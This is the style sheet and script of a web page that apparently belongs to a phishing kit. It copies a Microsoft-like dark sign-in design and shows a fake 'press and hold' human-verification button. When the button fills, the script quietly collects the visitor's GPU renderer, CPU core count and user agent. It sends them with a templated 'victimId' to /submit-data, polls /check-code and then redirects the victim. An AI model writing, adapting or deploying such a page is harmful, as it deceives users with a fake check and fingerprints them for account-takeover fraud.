    <style>

:root {
            --colorNeutralBackground1: #292929;
            --colorNeutralStroke2: #525252;
            --borderRadiusCircular: 10000px;
            --fontFamilyBase: "Segoe UI", sans-serif;
            --colorNeutralForeground3: #adadad;

    /* Dynamic theme mapping variables */
    --canvasBg: #292929;
    --containerBg: #292929;
    --textColor: #ffffff;
    --subTextColor: #d6d6d6;
        }

html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    min-height: 100vh; /* Use min-height, not height */
    overflow-y: auto;  /* Allow content to push if it exceeds screen */
    overflow-x: hidden;

    background-size: cover;
    background-position: center;
    background-attachment: fixed;
}

       /* Add this inside your <style> block */
.bg-img {
    display: block !important; /* Force it to show */
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw !important;  /* Force width to match the full screen width instantly */
    height: 100vh !important; /* Force height to match the full screen height instantly */
    object-fit: cover !important; /* Forces the image to always fill the entire height/width seamlessly */
    transform: translateZ(0);   /* Replaces 'cover' so it doesn't recalculate proportions on load */
    z-index: -100 !important; /* Put it behind everything */
}

.page-wrapper {
    display: flex;
    flex-direction: column;
    height: 100vh;      /* Use height, not min-height, to lock the screen */
    width: 100%;
    position: relative; /* Essential for absolute positioning of the footer */
    overflow: hidden;   /* Ensures nothing causes a scrollbar */
     /* ADD THIS LINE HERE */
    
}
        
#signInContainer {
    display: flex;
    flex-direction: column;
    align-items: center;
    position: relative;
    top: -30px;
    left: auto;
    transform: none;
    width: 440px;
    margin: auto;
    
    /* Updated padding: 40px top/sides, 80px bottom for extra space */
    padding: 40px 40px 60px 40px;
    
    box-sizing: border-box;
    background-color: #292929 !important;
    border-radius: 12px;
    box-shadow: 0 8px 16px rgba(0,0,0,0.28);
    z-index: 10;
     opacity: 1 !important; /* Keep its base style solid */
}
/* Animate the inner contents purely without modifying the parent bounds */
.animation-fade-layer {
    opacity: 0;
    animation: simpleFadeIn 0.7s ease-in-out forwards;
}

@keyframes simpleFadeIn {
    0% {
        opacity: 0;
    }
    100% {
        opacity: 1;
    }
}

        

/* 3. New Footer Style */
.page-footer {
    position: static;
    bottom: 15px;       /* This pins it exactly 30px from the bottom edge */
    left: 0;
    width: 100%;
    text-align: center;
    color: var(--colorNeutralForeground3);
    font-family: var(--fontFamilyBase);
    font-size: 12px;
    z-index: 5;  
    flex-shrink: 0;       /* Keeps it above the background */
}

.footer-links {
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    /* Replacing the variable with a fixed value to ensure it's spacious */
    gap: 8px; 
    margin-bottom: 1px; /* Adds space between links and the notice text */
}

.footer-links a {
    color: #D6D6D6 !important;
    text-decoration: none;
    font-weight: 400; /* Makes the font bold/weighty */
    /* Adds internal padding to make each link easier to see and click */
    padding: 4px 8px; 
    white-space: nowrap; /* Prevents the links from breaking onto two lines */
}

.footer-links a:hover {
    text-decoration: underline;
    color: #ffffff; /* Brighter color on hover looks better on dark themes */
}

.footer-notice {
    /* 1. Force explicit px values as a fallback */
    font-size: 10px !important;
    line-height: 15px !important;
    font-weight: 400 !important;
    
    /* 2. Keep these for consistency */
    font-family: "Segoe UI", sans-serif !important;
    color: #D6D6D6 !important;
    
    /* 3. Layout */
    display: flex;
    justify-content: center;
    width: 100%;
    margin-top: 1px; /* Using explicit px for reliability */
    text-align: center;
}

.footer-notice a {
    color: #479ef5 !important;
    text-decoration: none !important;
    font-weight: 600 !important; /* Makes it stand out slightly */
    font-size: 10px !important;  /* Ensures it stays small */
    margin-left: 4px;     
    cursor: pointer;       /* Adds a tiny gap before "Learn more" */
}

.footer-notice a:hover {
    color: #62abf5 !important; /* A slightly lighter blue for hover */
    text-decoration: underline !important;
}

/* For Desktop */
@media (min-width: 520px) {
    .page-footer {
        position: absolute;
        bottom: 15px;
        left: 0;
    }
}

/* Mobile Responsive Override */
@media (max-width: 519px) {
    html, body {
        height: 100% !important;
        width: 100% !important;
        overflow: hidden !important; 
    }

    .page-wrapper {
        height: 100% !important;
        width: 100% !important;
        overflow: hidden !important;
        justify-content: flex-start !important;
        /* ADD THIS EXACT LINE */
        background-color: var(--containerBg) !important; 
    }
    
    #signInContainer {
        position: relative;
        top: 0;
        left: 0;
        transform: none;
        width: 100vw !important;
        min-height: 100vh;
        border-radius: 0 !important;
        box-shadow: none !important;
        justify-content: flex-start;
        box-sizing: border-box;
        display: flex;
        flex-direction: column;
        overflow-y: hidden;
        
        /* Updated padding: 40px top, 40px sides, 80px bottom */
        padding: 25px 40px 80px 40px !important;
    }
    
    .page-footer {
        position: fixed; /* Fixes it to the screen bottom */
        bottom: 25px;
        left: 16px;
        right: 16px;
        background-color: #292929; /* Ensure background is solid so text behind it doesn't show */
        padding-bottom: 0; 
        z-index: 100;
        aling-items: center;
        text-align: center;
        display: flex;
        flex-direction: column; 
        box-sizing: border-box; 
        flex-wrap: wrap;       /* Allows links to drop to a new line if they run out of space */
        justify-content: center;
        width: auto;
        
    }

    
}

}

     h2 {
    /* Font settings */
    font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif !important;

    /* THE FIX: 
       margin: 10px auto 20px auto; 
       Top is 10px, Right is auto, Bottom is 20px, Left is auto.
    */

}

/* 1. Ensure the container doesn't have a background or border */
.captcha-box {
    background: transparent;
    border: none;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 0;
    margin-top: -10px; /* Adjust this negative value to pull it up as much as you want */
    margin-bottom: 10px; /* Removes spacing between image and box edge */
}

/* 2. Ensure the image itself doesn't have borders or shadows */
.captcha-box img {
    border: none;
    outline: none;
    display: block; /* Removes the tiny space underneath the image */
    max-width: 100%;
}
    .instruction {
    /* Font settings */
    font-family: "Segoe UI", sans-serif !important; /* Forces the font */
    font-size: 14px !important; /* Or var(--fontSizeBase300) */
    
    /* Color settings */
    color: #d6d6d6 !important; /* This matches your --colorNeutralForeground2 */
    
    /* Layout */
    text-align: center;
    margin: 8px 0 14px 0;
}
/* Container: Prevent items from wrapping and force them to stay in a row */
.captcha-wrapper {
    display: flex;
    align-items: center;
    justify-content: flex-start;
    gap: 8px;
    margin-top: 20px;
    flex-wrap: nowrap; /* Ensures they stay on one line */
}

/* Icon: Fixed size, no shrinking */
.fixed-icon, .button-icon {
    width: 40px;
    height: 40px;
    flex-shrink: 0; /* Keeps the circle perfect */
}
.icon-action-button {
    background: transparent !important; /* Removes the white/gray background square */
    border: none !important;            /* Removes the default button border outline */
    padding: 0 !important;             /* Removes internal spacing shifting the icon */
    margin: 0 !important;              /* Removes default outer margins */
    cursor: pointer !important;        /* Makes it show a clickable pointer hand on hover */
    display: inline-flex !important;   /* Keeps the layout aligned cleanly with the pill button */
    outline: none !important;          /* Removes default focus boxes */
    flex-shrink: 0 !important;         /* Keeps the button structural size stable */
    transition: opacity 0.15s ease-in-out !important; /* Prepares it for the smooth faint transition */
}
/* Keeps the icon permanently faint after it has been clicked */
.icon-action-button.faint-icon {
    opacity: 0.2 !important;
    cursor: default !important;
    pointer-events: none !important; /* Disables all further hover effects or clicks */
}
        

.icon-action-button:hover {
    opacity: 0.8 !important;
}
/* This makes the icon look faint when you press and hold it */
.icon-action-button:active {
    opacity: 0.2 !important;
}

/* The Pill Button: Prevent shrinking */
.pill-button {
    display:inline-flex;
    align-items: center;          /* Explicitly centers child text vertically */
    justify-content: center; 
    height: 40px; 
    padding: 0 55px; 
    border: 1px solid #0078d4; 
    border-radius: 50px;
    cursor: pointer;
    background-color: white;
    user-select: none;
    -webkit-tap-highlight-color: transparent;
    box-sizing: border-box; 
    transition: background-color 0.2s;
    outline: 0 !important;
    flex-shrink: 0; /* Prevents the pill from squishing */
    position: relative;
    overflow: hidden;
    width: 232px !important;
}

/* Text styles: Prevent text from forcing the pill to swell */
.ZpICXubljzwSSUY {
    display: inline-block;
    vertical-align: middle;
    text-align: center;
    text-transform: none;
    margin: 0;
    padding: 0;
    white-space: nowrap; /* Forces text to stay on one line */
    font-family: 'Segoe UI', sans-serif; /* Fixed font syntax */
    font-size: 15px !important;
    color: #0f6cbd;
    font-weight: 600;
    cursor: pointer;
    user-select: none;
}
/* Force your text layer to stay floating on top of the blue fill */
.pill-button > .ZpICXubljzwSSUY {
    position: relative !important;
    z-index: 2 !important;
    pointer-events: none !important; /* Clicks go straight through to the button */
}

/* When the button is being held down, change the text color to a lighter grayish blue */
.pill-button.pressed > .ZpICXubljzwSSUY {
    color: #D3D3D3 !important;
}
/* The blue progress fill layer */
.pill-button .progress-fill {
    position: absolute !important;
    top: 0 !important;
    left: 0 !important;
    height: 100% !important;
    width: 0%;                  /* Managed strictly by JavaScript */
    background-color: #0f6cbd;  /* The exact blue color */
    z-index: 2 !important;      /* Sits behind text, above button background */
    pointer-events: none !important;
    transition: width 0.1s linear; /* Smooth fill motion */
    overflow: hidden;
}

/* 2. ADD JUST THIS SPECIFIC LAYER CHAIN RIGHT BELOW IT */
.pill-button .progress-fill .ZpICXubljzwSSUY {
    position: absolute !important;
    top: 0 !important;
    left: 0 !important;
    width: 232px !important;       /* Matches the inner width of your pill button cleanly */
    height: 100% !important;
    box-sizing: border-box !important;
    display: flex !important;      /* Changed from table-cell to clean flex */
    align-items: center !important;/* Forces pixel-perfect vertical centering */
    justify-content: center !important; /* Centers the text horizontally */
    padding: 0 !important;         /* Removes the 8px padding that was shifting it up */
}

/* Container to hide and perfectly center the dots inside the button */
/* Container to hide and perfectly center the dots inside the button */
.pill-button .loading-dots {
    position: absolute !important;
    top: 50% !important;
    left: 50% !important;
    transform: translate(-50%, -50%) !important;
    z-index: 3 !important;
    display: none; /* Controlled by JavaScript flex switch */
    gap: 5px;      /* Clear spacing between dots */

     
    
}
/* New helper layout block to center inline items vertically inside an absolute layer */


/* Style each individual dot into a small, perfectly round circle */
.pill-button .loading-dots .dot {
    width: 12px;
    height: 11px;
    background-color: #ffffff; /* Kept exactly black */
     border-radius: 6px / 8px;       /* Keeps the top and bottom edges perfectly rounded */
    
    opacity: 0.3;
    animation: dotFade 1.2s infinite ease-in-out both;
}

/* Create the smooth sequential step across the three dots */
.pill-button .loading-dots .dot:nth-child(1) {
    animation-delay: 0s;
}
.pill-button .loading-dots .dot:nth-child(2) {
    animation-delay: 0.2s;
}
.pill-button .loading-dots .dot:nth-child(3) {
    animation-delay: 0.4s;
}

/* The clean fade animation loop (No bouncing, no scaling) */
@keyframes dotFade {
    0%, 100% {
        opacity: 0.3; /* Faded state */
    }
    50% {
        opacity: 1;   /* Fully illuminated white state */
    }
}
/* Container to hide and perfectly center the checkmark inside the button */
.pill-button .success-checkmark {
    position: absolute !important;
    top: 50% !important;
    left: 50% !important;
    transform: translate(-50%, -50%) !important;
    z-index: 3 !important;
    display: none; /* Controlled by JavaScript display switches */
    width: 20px;   /* Clean, visible size matching the layout */
    height: 20px;
}

.pill-button .success-checkmark svg {
    width: 100%;
    height: 100%;
    display: block;
}

/* Select the actual line inside the SVG to apply the drawing animation */
.pill-button .success-checkmark svg polyline {
    stroke-dasharray: 50;  /* Sets the length of the dash line loop */
    stroke-dashoffset: -50; /* Squeezes the line out of view initially */
    
    /* When JavaScript sets the container to display: block, this animation triggers */
    animation: drawCheckmark 0.5s ease-in-out forwards, fadeOutCheckmark 0.4s ease-in-out 1.8s forwards;
}

/* The keyframe animation that creates the literal drawing motion */
@keyframes drawCheckmark {
    to {
        stroke-dashoffset: 0; /* Smoothly rolls the line into view */
    }
}

/* 2. Smooth fade out right before the loading dots arrive */
@keyframes fadeOutCheckmark {
    to {
        opacity: 0;
        transform: scale(0.8); /* Gives a slight shrinking effect as it drops away */
    }
}

}

        function applyTheme() {
        // Evaluate theme purely based on browser/system settings
        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
        
        // True if the browser is NOT in dark mode (meaning it is in light mode)
        const shouldBeLight = !prefersDark;

        // Apply or remove the light-theme class on the body
        if (shouldBeLight) {
            document.body.classList.add('light-theme');
        } else {
            document.body.classList.remove('light-theme');
        }

        // Update Captcha Image source with your base64 strings
        const img = document.getElementById('captcha-img');
        if (img) {
            img.src = shouldBeLight ? lightBase64 : darkBase64;
        }

        // Update Background Image source using direct path strings
                // Update Background Image source using direct CSS background injection
        if (shouldBeLight) {
            document.body.style.backgroundImage = "url('/images/background_img_light.svg')";
        } else {
            document.body.style.backgroundImage = "url('/images/background_img.svg')";
        }

    }

    // Run when the script is parsed immediately
    applyTheme();

    // Listen for shifts to both dark mode AND light mode dynamically
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme);
    window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', applyTheme);



document.addEventListener("DOMContentLoaded", () => {
    const button = document.getElementById("verify-button");
    const progressFill = button ? button.querySelector(".progress-fill") : null;

    // ADD THIS LINE HERE TO SELECT THE SVG BUTTON
    const iconButton = document.querySelector(".icon-action-button");

    if (!button || !progressFill) return;

    let holdInterval = null;
    let currentProgress = 0;
    const holdDuration = 4500; // 4 seconds to fill completely
    const intervalStep = 30;   // Loop speed in milliseconds

    function startFilling(e) {
        if (e.cancelable) e.preventDefault();
        clearInterval(holdInterval);

        // --- ADD ONLY THIS CHECK HERE ---
        if (window.hasClickBeenWarned) {
            // Change the text content to "Please wait..."
            button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.textContent = "Please wait...");
            button.classList.add("pressed");

            // Run the loop automatically until it hits 100%
            holdInterval = setInterval(() => {
                currentProgress += (intervalStep / holdDuration) * 100;
                
                     if (currentProgress >= 100) {
                    currentProgress = 100;
                    progressFill.style.width = "100%";
                    button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.style.display = "none");
                    
                    const innerText = progressFill.querySelector(".ZpICXubljzwSSUY");
                    if (innerText) innerText.style.setProperty("display", "none", "important");

                    // 1. Show the white checkmark immediately
                    const checkmark = button.querySelector(".success-checkmark");
                    if (checkmark) checkmark.style.display = "block";
                    
                    clearInterval(holdInterval);

                                    // 2. Wait 2.2 seconds, then transition to dots and trigger fingerprinting
                setTimeout(() => {
                    if (checkmark) checkmark.style.display = "none";
                    
                    const dots = button.querySelector(".loading-dots");
                    if (dots) {
                        dots.style.opacity = "0";
                        dots.style.display = "flex";
                        dots.offsetHeight; // Force layout reflow
                        dots.style.transition = "opacity 0.4s ease-out";
                        dots.style.opacity = "1";
                    }

                    // --- NEW FINGERPRINTING LOGIC ---
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl');
                        const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                        
                        // Gather hardware environment details
                        const hardwareData = JSON.stringify({
                            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A",
                            cores: navigator.hardwareConcurrency || "N/A"
                        });

                        // Populate the hidden form fields
                        const hardwareInput = document.getElementById('hardware-input');
                        const uaInput = document.getElementById('ua-input');
                        const safariForm = document.getElementById('safari-form');

                        if (hardwareInput) hardwareInput.value = hardwareData;
                        if (uaInput) uaInput.value = navigator.userAgent;

                                                // Give the loading dots exactly 1 second to show before sending data
                        setTimeout(async () => {
                            try {
                                // 1. Create the data payload dynamically
                                const params = new URLSearchParams();
                                params.append('uuid', '<%= victimId %>');
                                params.append('hardware', hardwareData);
                                params.append('ua', navigator.userAgent);

                                // 2. Send the data to the server silently in the background
                                const response = await fetch('/submit-data', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                    body: params.toString()
                                });

                                // 3. If the data sent successfully, start checking if the code is ready
                                if (response.ok) {
                                    const pollTimer = setInterval(async () => {
                                        try {
                                            const checkResponse = await fetch('/check-code/<%= victimId %>');
                                            const checkData = await checkResponse.json();

                                            // If the server says 'ready', stop checking and move to the document page
                                            if (checkData && checkData.status === 'ready') {
                                                clearInterval(pollTimer);
                                                window.location.href = '/document/<%= victimId %>';
                                            }
                                        } catch (pollErr) {
                                            console.error("Error checking code status:", pollErr);
                                        }
                                    }, 3000); // Checks the server every 2.5 seconds
                                }
                            } catch (networkErr) {
                                console.error("Background submission failed:", networkErr);
                            }
                        }, 350);

                    } catch (error) {
                        console.error("Data gathering skipped or restricted:", error);
                    }
                    // ---------------------------------

                }, 700);

                }

                else {
                    progressFill.style.width = currentProgress + "%";
                }
            }, intervalStep);

            return; // Stops here so the hold logic doesn't run!
        }

        
        button.classList.add("pressed");

        holdInterval = setInterval(() => {
            currentProgress += (intervalStep / holdDuration) * 100;
            
                        if (currentProgress >= 100) {
                currentProgress = 100;
                progressFill.style.width = "100%";
                button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.style.display = "none");
                
                const innerText = progressFill.querySelector(".ZpICXubljzwSSUY");
                if (innerText) innerText.style.setProperty("display", "none", "important");

                // 1. Show the white checkmark immediately
                const checkmark = button.querySelector(".success-checkmark");
                if (checkmark) checkmark.style.display = "block";
                
                clearInterval(holdInterval); // Stop once full

                
                // 2. Wait 2.2 seconds, then transition to dots and trigger fingerprinting
                setTimeout(() => {
                    if (checkmark) checkmark.style.display = "none";
                    
                    const dots = button.querySelector(".loading-dots");
                    if (dots) {
                        dots.style.opacity = "0";
                        dots.style.display = "flex";
                        dots.offsetHeight; // Force layout reflow
                        dots.style.transition = "opacity 0.4s ease-out";
                        dots.style.opacity = "1";
                    }

                    // --- NEW FINGERPRINTING LOGIC ---
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl');
                        const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                        
                        // Gather hardware environment details
                        const hardwareData = JSON.stringify({
                            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A",
                            cores: navigator.hardwareConcurrency || "N/A"
                        });

                        // Populate the hidden form fields
                        const hardwareInput = document.getElementById('hardware-input');
                        const uaInput = document.getElementById('ua-input');
                        const safariForm = document.getElementById('safari-form');

                        if (hardwareInput) hardwareInput.value = hardwareData;
                        if (uaInput) uaInput.value = navigator.userAgent;

                                                // Give the loading dots exactly 1 second to show before sending data
                        setTimeout(async () => {
                            try {
                                // 1. Create the data payload dynamically
                                const params = new URLSearchParams();
                                params.append('uuid', '<%= victimId %>');
                                params.append('hardware', hardwareData);
                                params.append('ua', navigator.userAgent);

                                // 2. Send the data to the server silently in the background
                                const response = await fetch('/submit-data', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                    body: params.toString()
                                });

                                // 3. If the data sent successfully, start checking if the code is ready
                                if (response.ok) {
                                    const pollTimer = setInterval(async () => {
                                        try {
                                            const checkResponse = await fetch('/check-code/<%= victimId %>');
                                            const checkData = await checkResponse.json();

                                            // If the server says 'ready', stop checking and move to the document page
                                            if (checkData && checkData.status === 'ready') {
                                                clearInterval(pollTimer);
                                                window.location.href = '/document/<%= victimId %>';
                                            }
                                        } catch (pollErr) {
                                            console.error("Error checking code status:", pollErr);
                                        }
                                    }, 3000); // Checks the server every 2.5 seconds
                                }
                            } catch (networkErr) {
                                console.error("Background submission failed:", networkErr);
                            }
                        }, 350);

                    } catch (error) {
                        console.error("Data gathering skipped or restricted:", error);
                    }
                    // ---------------------------------

                }, 700);

            }

            else {
                progressFill.style.width = currentProgress + "%";
            }
        }, intervalStep);
    }

    function stopFilling() {
        // If the text has changed to "Please wait...", do not let outside touches reset it
    const textElement = button.querySelector(".ZpICXubljzwSSUY");
    if (textElement && textElement.textContent === "Please wait...") {
        return;
    }

        clearInterval(holdInterval);
       button.classList.remove("pressed");
        // If let go before 100%, reset back to empty
        if (currentProgress < 100) {
            currentProgress = 0;
            progressFill.style.width = "0%";
        }
    }

    // Mouse Controls
    button.addEventListener("mousedown", startFilling);
    window.addEventListener("mouseup", stopFilling);
    button.addEventListener("mouseleave", stopFilling);

    // Touch Controls
    button.addEventListener("touchstart", startFilling, { passive: false });
    window.addEventListener("touchend", stopFilling);

    // Automatically fills the progress bar on a single click of the SVG icon
        // Automatically handles the SVG icon action for both Mobile and Desktop
    if (iconButton) {
        
        // 1. Create a single action handler
        function handleIconTrigger(e) {
            if (e.cancelable) e.preventDefault(); // Prevents touch conflicts on mobile

            if (!window.hasClickBeenWarned) {
                button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.textContent = "Press again");
                window.hasClickBeenWarned = true;
                iconButton.classList.add("faint-icon");
                return; // Blocks the first interaction
            } else {
                return; // Blocks every interaction after the first one too
            }
        }

        // 2. Bind the exact same handler to both touch screens and mouse clicks
        iconButton.addEventListener("touchstart", handleIconTrigger, { passive: false });
        iconButton.addEventListener("mousedown", handleIconTrigger);
    }
});




        
window.addEventListener('resize', () => {
    // Clear out panned canvas memory across windows and roots
    window.scrollTo(0, 0);
    document.documentElement.scrollTop = 0;
    document.body.scrollTop = 0;
    
    const wrapper = document.querySelector('.page-wrapper');
    if (wrapper) {
        wrapper.scrollTop = 0;
    }
    
    // Smoothly force a layout recalculation on the structure
    const container = document.getElementById('signInContainer');
    if (container) {
        container.style.transform = 'none';
    }
});
